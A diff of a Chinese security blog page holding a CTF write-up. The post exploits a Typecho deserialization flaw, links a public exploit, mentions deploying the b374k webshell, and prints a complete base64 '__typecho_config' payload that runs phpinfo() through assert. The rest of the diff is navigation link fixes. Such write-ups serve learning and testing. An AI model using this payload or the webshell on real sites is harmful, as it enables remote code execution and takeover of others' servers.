@@ -407,7 +407,6 @@ height:50vh;
 <h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>　　进入页面后为空白页，使用扫描器扫描存在的页面得结果：<br>　　<img src="/img/Typecho-反序列化漏洞/1.png" alt=""><br>　　后台存在三个页面：install.php，以及admin目录下两个页面：login.php和admin.php<br>　　login.php为404无法登陆，不存在后台，提示信息为Typecho，点击可以进入官方主页面，主要就是个轻量级的开源博客系统。<br>　　menu.php也没内容。。。估计是有人使坏删东西了。。。<br>　　搜索该博客系统的漏洞，有一个反序列化getshell的漏洞，github项目：<a href="https://github.com/BennyThink/Typecho_deserialization_exploit" target="_blank" rel="noopener">https://github.com/BennyThink/Typecho_deserialization_exploit</a><br>　　按照exp脚本：<br>　　<img src="/img/Typecho-反序列化漏洞/2.png" alt=""><br>　　部署b374k.php（一种很方便的webshell）后，进入页面，输入b374k就可以看到整个后台的目录了<br>　　<img src="/img/Typecho-反序列化漏洞/3.png" alt=""><br>　　找到f8l4a5g.txt，访问得flag:flag{typecho-bugku-get}</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>　　下面这段payload用于执行phpinfo()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUxMTc5NTIwMTtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</span><br></pre></td></tr></table></figure></p>
 <p>　　使用hackbar:<br>　　<img src="/img/Typecho-反序列化漏洞/4.png" alt=""></p>
-<p>　　</p>
 
     </article>
     <!-- license  -->
@@ -424,7 +423,7 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/Metasploit渗透测试魔鬼训练营-第一天/" title= Metasploit渗透测试魔鬼训练营 第一天 >
+                <a href= "/Metasploit渗透测试魔鬼训练营-环境搭建/" title= Metasploit渗透测试魔鬼训练营 第一天 >
                     <div class="nextTitle">Metasploit渗透测试魔鬼训练营 第一天</div>
                 </a>
             
@@ -1050,6 +1049,20 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 36
@@ -1068,7 +1081,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-第一天/" >Metasploit渗透测试魔鬼训练营 第一天</a>
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-环境搭建/" >Metasploit渗透测试魔鬼训练营 第一天</a>
         </li>
     
     
@@ -1102,12 +1115,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/ThinkPHP框架学习---框架目录及框架配置/" >ThinkPHP框架学习---框架目录及框架配置</a>
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/ThinkPHP框架学习---config类和config助手函数/" >ThinkPHP框架学习---config类和config助手函数</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/ThinkPHP框架学习---config类和config助手函数/" >ThinkPHP框架学习---config类和config助手函数</a>
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/ThinkPHP框架学习---框架目录及框架配置/" >ThinkPHP框架学习---框架目录及框架配置</a>
         </li>
     
     
